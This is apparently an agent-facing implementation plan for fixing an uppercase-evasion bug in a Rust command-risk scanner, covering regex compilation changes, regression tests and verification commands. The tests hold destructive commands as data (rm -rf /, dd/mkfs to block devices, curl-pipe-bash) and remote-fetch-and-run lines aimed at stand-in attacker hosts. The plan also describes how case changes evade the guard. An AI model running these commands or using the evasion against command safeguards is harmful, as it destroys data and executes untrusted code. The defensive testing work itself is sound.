# C1 Uppercase Regex Bypass Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close TASKS.md C1 so uppercase variants of built-in regex-backed `Warn`/`Danger`/`Block` commands classify identically to their lowercase forms instead of falling through to `Safe`.

**Architecture:** Keep the existing two-pass scanner architecture: Aho-Corasick remains the case-insensitive fast path and regex remains the slower verification path. The implementation makes built-in regex verification case-insensitive at compile time, while preserving custom/user regex case sensitivity to avoid silently changing user-defined policy semantics.

**Tech Stack:** Rust 2024, `regex::RegexBuilder`, `aho-corasick`, `aegis-scanner`, synchronous scanner hot path, existing `rtk cargo ...` verification commands.

---

## Scope

This plan implements **only** the first open task in `TASKS.md`:

> C1 — Uppercase bypasses all regex patterns.

Non-goals for this plan:

- Do not implement C2 `$IFS` normalization.
- Do not implement C3 config ratchet semantics.
- Do not expand the pattern database for H3/M5.
- Do not change dependency manifests, CI files, or lockfiles.
- Do not convert regex patterns to prefix rules.

## Current failure mode

`Scanner::try_new` compiles regex patterns with `Regex::new(&p.pattern)`. Aho-Corasick keywords are built with `.ascii_case_insensitive(true)`, so `RM -RF /` triggers the quick scan. The full regex scan then misses because built-in regexes are case-sensitive unless each individual pattern already carries `(?i)`. The scanner returns `Safe` when full scan finds no match.

The fix is to compile built-in regex patterns through `RegexBuilder` with `case_insensitive(true)`.

## Files to modify

- Modify: `crates/aegis-scanner/src/scanner/mod.rs`
  - Import `RegexBuilder` and `PatternSource`.
  - Add a small helper that compiles regex patterns and enables case-insensitive mode only for `PatternSource::Builtin`.
  - Replace direct `Regex::new(...)` in `Scanner::try_new` with the helper.
- Modify: `crates/aegis-scanner/src/scanner/tests/basic.rs`
  - Add targeted uppercase regression tests for built-in regex-backed destructive patterns.
  - Add one custom-pattern regression test proving custom regexes remain case-sensitive.
- Modify: `TASKS.md`
  - Mark C1 as done only after full verification passes.
- Modify: `PROJECT_STATE.md`
  - Update the current-session summary and remove C1 from the P0 blocker list only after full verification passes.
- Modify: `CHANGELOG.md`
  - Add a `Fixed` entry under `[Unreleased]` after the implementation is complete.

## Design choices

### Recommended approach: case-insensitive built-in regex compilation

Use `RegexBuilder::new(pattern).case_insensitive(true).build()` for built-in regexes only.

Why this is recommended:

- Keeps the scanner hot path synchronous and allocation profile unchanged after construction.
- Aligns regex verification with the already case-insensitive Aho-Corasick fast path.
- Avoids editing every regex in `patterns.toml` by hand.
- Preserves user custom regex semantics unless the user explicitly adds `(?i)`.

### Rejected approach: add `(?i)` to every built-in regex string

Rejected because it is repetitive, easy to miss during future pattern additions, and makes `patterns.toml` noisier.

### Rejected approach: lowercase the command before full scan

Rejected because it would corrupt matched text/highlight ranges for Unicode-adjacent cases and could break custom patterns or case-sensitive path/string semantics.

---

## Task 1: Add failing uppercase scanner regressions

**Files:**
- Modify: `crates/aegis-scanner/src/scanner/tests/basic.rs`

- [ ] **Step 1: Add helper functions near the existing `assess_risk_levels` tests**

Add this code above `fn assess_risk_levels()`:

```rust
fn assert_assessment_matches_pattern(cmd: &str, expected_risk: RiskLevel, expected_id: &str) {
    let s = scanner();
    let assessment = s.assess(cmd);

    assert_eq!(
        assessment.risk, expected_risk,
        "command {cmd:?}: got {:?}, expected {expected_risk:?}",
        assessment.risk,
    );
    assert!(
        assessment
            .matched
            .iter()
            .any(|m| m.pattern.id.as_ref() == expected_id),
        "command {cmd:?}: expected pattern id {expected_id}, got {:?}",
        assessment
            .matched
            .iter()
            .map(|m| m.pattern.id.as_ref())
            .collect::<Vec<_>>()
    );
}
```

- [ ] **Step 2: Add uppercase regression tests for cited C1 examples**

Add this code below the helper from Step 1:

```rust
#[test]
fn assess_blocks_uppercase_rm_rf_root() {
    assert_assessment_matches_pattern("RM -RF /", RiskLevel::Block, "PS-006");
}

#[test]
fn assess_flags_uppercase_dd_to_block_device() {
    assert_assessment_matches_pattern(
        "DD IF=/dev/zero OF=/dev/sda",
        RiskLevel::Danger,
        "FS-003",
    );
}

#[test]
fn assess_blocks_uppercase_mkfs() {
    assert_assessment_matches_pattern("MKFS.EXT4 /dev/sdb1", RiskLevel::Block, "FS-006");
}

#[test]
fn assess_flags_uppercase_shred() {
    assert_assessment_matches_pattern("SHRED -U secrets.txt", RiskLevel::Danger, "FS-004");
}

#[test]
fn assess_flags_uppercase_find_delete() {
    assert_assessment_matches_pattern("FIND /var -DELETE", RiskLevel::Danger, "FS-002");
}

#[test]
fn assess_warns_on_uppercase_chmod_world_writable() {
    assert_assessment_matches_pattern("CHMOD 777 /var/www", RiskLevel::Warn, "FS-007");
}
```

- [ ] **Step 3: Add coverage for remaining built-in regex-backed Danger/Block classes**

Add this code below the tests from Step 2:

```rust
#[test]
fn assess_blocks_uppercase_redirect_to_raw_block_device() {
    assert_assessment_matches_pattern("ECHO data > /DEV/SDA", RiskLevel::Block, "FS-009");
}

#[test]
fn assess_flags_uppercase_mv_etc_contents() {
    assert_assessment_matches_pattern("MV /ETC/hosts /tmp/hosts.bak", RiskLevel::Danger, "FS-010");
}

#[test]
fn assess_flags_uppercase_accept_data_loss_flag() {
    assert_assessment_matches_pattern(
        "mongorestore --ACCEPT-DATA-LOSS --host rs0/host:27017",
        RiskLevel::Danger,
        "DB-005",
    );
}

#[test]
fn assess_blocks_uppercase_umount_root() {
    assert_assessment_matches_pattern("SUDO UMOUNT -F /", RiskLevel::Block, "PS-007");
}

#[test]
fn assess_flags_uppercase_curl_pipe_bash() {
    assert_assessment_matches_pattern(
        "CURL https://example.com/install.sh | BASH",
        RiskLevel::Danger,
        "PKG-001",
    );
}

#[test]
fn assess_flags_uppercase_wget_pipe_sh() {
    assert_assessment_matches_pattern(
        "WGET https://example.com/setup.sh | SH",
        RiskLevel::Danger,
        "PKG-002",
    );
}

#[test]
fn assess_flags_uppercase_bash_process_substitution() {
    assert_assessment_matches_pattern(
        "BASH <( CURL https://evil.example/pwn.sh )",
        RiskLevel::Danger,
        "PKG-003",
    );
}

#[test]
fn assess_flags_uppercase_eval_remote_download() {
    assert_assessment_matches_pattern(
        "EVAL $( WGET https://attacker.example/pwn.sh )",
        RiskLevel::Danger,
        "PKG-004",
    );
}

#[test]
fn assess_flags_uppercase_echo_pipe_bash() {
    assert_assessment_matches_pattern("ECHO rm -rf /tmp/demo | BASH", RiskLevel::Danger, "EXEC-001");
}
```

- [ ] **Step 4: Run the targeted tests and verify they fail before implementation**

Run:

```bash
rtk cargo test -p aegis-scanner scanner::tests::basic::assess_blocks_uppercase_rm_rf_root -- --exact
```

Expected result before implementation:

```text
test scanner::tests::basic::assess_blocks_uppercase_rm_rf_root ... FAILED
```

The failure should show `got Safe, expected Block` or a missing `PS-006` match.

- [ ] **Step 5: Run the full new uppercase group and save the failure signal**

Run:

```bash
rtk cargo test -p aegis-scanner scanner::tests::basic::assess_ -- --nocapture
```

Expected result before implementation: the newly added uppercase tests fail, while unrelated existing assessment tests may still pass.

---

## Task 2: Compile built-in regexes case-insensitively

**Files:**
- Modify: `crates/aegis-scanner/src/scanner/mod.rs`

- [ ] **Step 1: Change the regex imports**

Replace:

```rust
use regex::Regex;
```

with:

```rust
use regex::{Regex, RegexBuilder};
```

- [ ] **Step 2: Import `PatternSource`**

Replace:

```rust
use crate::patterns::{Pattern, PatternSet};
```

with:

```rust
use crate::patterns::{Pattern, PatternSet, PatternSource};
```

- [ ] **Step 3: Add a focused compile helper inside `impl Scanner`**

Add this method inside `impl Scanner`, before `pub fn try_new(...)`:

```rust
    fn compile_regex(pattern: &Pattern) -> Result<Regex, ScannerError> {
        let mut builder = RegexBuilder::new(pattern.pattern.as_ref());
        if pattern.source == PatternSource::Builtin {
            builder.case_insensitive(true);
        }
        builder.build().map_err(|e| ScannerError::InvalidPattern {
            id: pattern.id.to_string(),
            reason: format!("invalid regex: {e}"),
        })
    }
```

Rust best-practice notes:

- The helper borrows `Pattern`; it does not clone the regex string.
- The helper returns the existing typed `ScannerError` instead of panicking.
- The helper keeps policy explicit: built-ins are case-insensitive, custom patterns retain user semantics.

- [ ] **Step 4: Replace direct regex compilation in `try_new`**

Replace this block in `Scanner::try_new`:

```rust
            let rx = Regex::new(&p.pattern).map_err(|e| ScannerError::InvalidPattern {
                id: p.id.to_string(),
                reason: format!("invalid regex: {e}"),
            })?;
```

with:

```rust
            let rx = Self::compile_regex(p)?;
```

- [ ] **Step 5: Run the first failing regression again**

Run:

```bash
rtk cargo test -p aegis-scanner scanner::tests::basic::assess_blocks_uppercase_rm_rf_root -- --exact
```

Expected result after implementation:

```text
test scanner::tests::basic::assess_blocks_uppercase_rm_rf_root ... ok
```

---

## Task 3: Preserve custom regex case sensitivity

**Files:**
- Modify: `crates/aegis-scanner/src/scanner/tests/basic.rs`

- [ ] **Step 1: Add a custom-pattern regression test**

Add this test near the uppercase regression tests:

```rust
#[test]
fn custom_regex_patterns_remain_case_sensitive() {
    let custom = Pattern {
        id: "CUSTOM-CASE-001".into(),
        category: Category::Process,
        risk: RiskLevel::Danger,
        pattern: "dangerouscustomtoken".into(),
        description: "case-sensitive custom regression pattern".into(),
        safe_alt: None,
        justification: None,
        source: PatternSource::Custom,
    };
    let patterns = PatternSet::from_sources(&[custom]).expect("custom pattern set should load");
    let scanner = Scanner::try_new(patterns).expect("custom pattern should compile");

    let uppercase = scanner.assess("DANGEROUSCUSTOMTOKEN");
    assert_eq!(uppercase.risk, RiskLevel::Safe);

    let lowercase = scanner.assess("dangerouscustomtoken");
    assert_eq!(lowercase.risk, RiskLevel::Danger);
}
```

- [ ] **Step 2: If Clippy objects to two assertions, split the test**

Only if `rtk cargo clippy -- -D warnings` complains, split the test into two tests with this shared helper:

```rust
fn scanner_with_case_sensitive_custom_pattern() -> Scanner {
    let custom = Pattern {
        id: "CUSTOM-CASE-001".into(),
        category: Category::Process,
        risk: RiskLevel::Danger,
        pattern: "dangerouscustomtoken".into(),
        description: "case-sensitive custom regression pattern".into(),
        safe_alt: None,
        justification: None,
        source: PatternSource::Custom,
    };
    let patterns = PatternSet::from_sources(&[custom]).expect("custom pattern set should load");
    Scanner::try_new(patterns).expect("custom pattern should compile")
}
```

Then use:

```rust
#[test]
fn custom_regex_patterns_do_not_match_uppercase_when_pattern_is_lowercase() {
    let scanner = scanner_with_case_sensitive_custom_pattern();
    let assessment = scanner.assess("DANGEROUSCUSTOMTOKEN");

    assert_eq!(assessment.risk, RiskLevel::Safe);
}

#[test]
fn custom_regex_patterns_still_match_exact_case() {
    let scanner = scanner_with_case_sensitive_custom_pattern();
    let assessment = scanner.assess("dangerouscustomtoken");

    assert_eq!(assessment.risk, RiskLevel::Danger);
}
```

- [ ] **Step 3: Run the custom-pattern test**

Run:

```bash
rtk cargo test -p aegis-scanner scanner::tests::basic::custom_regex_patterns_remain_case_sensitive -- --exact
```

Expected result:

```text
test scanner::tests::basic::custom_regex_patterns_remain_case_sensitive ... ok
```

If Step 2 split the test, run:

```bash
rtk cargo test -p aegis-scanner scanner::tests::basic::custom_regex_patterns_ -- --nocapture
```

Expected result: both custom-pattern tests pass.

---

## Task 4: Run scanner-focused verification

**Files:**
- No source edits unless tests reveal a scanner-specific failure.

- [ ] **Step 1: Run all `aegis-scanner` tests**

Run:

```bash
rtk cargo test -p aegis-scanner
```

Expected result:

```text
test result: ok
```

- [ ] **Step 2: Run security regression tests that exercise classification**

Run:

```bash
rtk cargo test --test security_regression
```

Expected result:

```text
test result: ok
```

- [ ] **Step 3: Run shell edge regressions**

Run:

```bash
rtk cargo test --test shell_edge_regressions
```

Expected result:

```text
test result: ok
```

- [ ] **Step 4: Run full scanner benchmark because this changes scanner construction/verification behavior**

Run:

```bash
rtk cargo bench --bench scanner_bench
```

Expected result:

```text
scanner_bench completes without benchmark failures
```

Record the p99 / relevant benchmark output in the implementation notes. The safe hot path should remain under the project target because `quick_scan` still returns `false` without regex evaluation for safe commands.

---

## Task 5: Run repository quality gates

**Files:**
- No source edits unless gates fail.

- [ ] **Step 1: Format check**

Run:

```bash
rtk cargo fmt --check
```

Expected result:

```text
no formatting diffs
```

If it fails, run `rtk cargo fmt`, then rerun `rtk cargo fmt --check`.

- [ ] **Step 2: Clippy**

Run:

```bash
rtk cargo clippy -- -D warnings
```

Expected result:

```text
no warnings
```

Do not silence warnings with `#[allow]`. Refactor. If a lint suppression is truly necessary, use `#[expect(...)]` with a reason comment.

- [ ] **Step 3: Full test suite**

Run:

```bash
rtk cargo test
```

Expected result:

```text
test result: ok
```

- [ ] **Step 4: Supply-chain audit**

Run:

```bash
rtk cargo audit
```

Expected result: no new actionable vulnerability caused by this change. Existing opt-in `starlark-policy` unmaintained advisories, if still present, should be noted separately and not attributed to C1.

- [ ] **Step 5: Dependency policy**

Run:

```bash
rtk cargo deny check
```

Expected result:

```text
checks passed
```

---

## Task 6: Update project tracking docs

**Files:**
- Modify: `TASKS.md`
- Modify: `PROJECT_STATE.md`
- Modify: `CHANGELOG.md`

- [ ] **Step 1: Mark C1 complete in `TASKS.md`**

Replace the C1 heading:

```markdown
### [ ] C1 — Uppercase bypasses all regex patterns
```

with:

```markdown
### [x] C1 — Uppercase bypasses all regex patterns
```

Add this line under the C1 status bullet:

```markdown
- **Resolution:** built-in regex patterns are compiled case-insensitively, with regression tests for uppercase destructive commands and custom-pattern case sensitivity.
```

- [ ] **Step 2: Update `PROJECT_STATE.md` session summary**

Add a new bullet under `What was done last session (2026-06-23)`:

```markdown
- Fixed C1 uppercase regex bypass by compiling built-in scanner regexes case-insensitively and adding uppercase destructive-command regressions
```

Replace the P0 blocker bullet:

```markdown
- P0 release blockers from the security review: uppercase regex bypass (C1), `$IFS` obfuscation bypass (C2), and project-local config weakening to audit-only (C3)
```

with:

```markdown
- Remaining P0 release blockers from the security review: `$IFS` obfuscation bypass (C2) and project-local config weakening to audit-only (C3)
```

- [ ] **Step 3: Add `CHANGELOG.md` fixed entry**

Under `## [Unreleased]` → `### Fixed`, prepend:

```markdown
- Fixed C1 uppercase scanner bypass by compiling built-in regex patterns case-insensitively while preserving custom regex case sensitivity.
```

- [ ] **Step 4: Review docs diff**

Run:

```bash
rtk git diff -- TASKS.md PROJECT_STATE.md CHANGELOG.md
```

Expected result: docs reflect only C1 completion and do not mark C2/C3 or broader 1.0 gates complete.

---

## Task 7: Final review and commit

**Files:**
- Review all changed files.

- [ ] **Step 1: Review complete diff**

Run:

```bash
rtk git diff -- crates/aegis-scanner/src/scanner/mod.rs crates/aegis-scanner/src/scanner/tests/basic.rs TASKS.md PROJECT_STATE.md CHANGELOG.md
```

Expected result:

- `Scanner::try_new` uses the new helper.
- Built-in regexes use case-insensitive compilation.
- Custom regexes remain case-sensitive.
- No production `unwrap()` / `expect()` was added.
- No dependency or CI files changed.

- [ ] **Step 2: Check working tree status**

Run:

```bash
rtk git status --short
```

Expected result: only intended files are modified.

- [ ] **Step 3: Stage the C1 implementation**

Run:

```bash
rtk git add crates/aegis-scanner/src/scanner/mod.rs crates/aegis-scanner/src/scanner/tests/basic.rs TASKS.md PROJECT_STATE.md CHANGELOG.md
```

- [ ] **Step 4: Commit with a short conventional commit**

Run:

```bash
rtk git commit -m "fix: close uppercase scanner bypass"
```

Expected result: commit succeeds with no `Co-Authored-By` trailer.

---

## Self-review checklist

- [ ] C1 reproduction is covered by tests that fail before the code change.
- [ ] Built-in regex verification and Aho-Corasick quick scan now agree on case behavior.
- [ ] Custom regex behavior remains case-sensitive unless the user writes `(?i)`.
- [ ] Scanner hot path remains synchronous.
- [ ] Safe-command quick scan remains allocation-free and does not run regexes when no keyword matches.
- [ ] No new dependencies were added.
- [ ] No `Cargo.toml`, `Cargo.lock`, `deny.toml`, or CI files were modified.
- [ ] No production `unwrap()` / `expect()` was added.
- [ ] `Block` remains non-bypassable.
- [ ] C2 and C3 remain open in docs.
